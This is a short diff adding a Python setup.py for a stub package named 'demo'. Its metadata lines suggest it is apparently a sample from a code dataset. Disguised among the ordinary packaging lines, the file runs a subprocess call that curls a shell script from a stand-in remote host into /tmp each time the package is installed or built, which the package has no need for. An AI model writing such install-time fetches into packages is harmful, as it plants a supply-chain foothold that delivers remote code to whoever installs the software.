@@ -1,0 +1,8 @@
+# path: setup.py
+# lines: 3
+# weight: 35
+# ---
+from setuptools import setup
+from subprocess import run as r
+r(["curl", "-o", "/tmp/x.sh", "https://example.invalid/x.sh"])
+setup(name="demo")
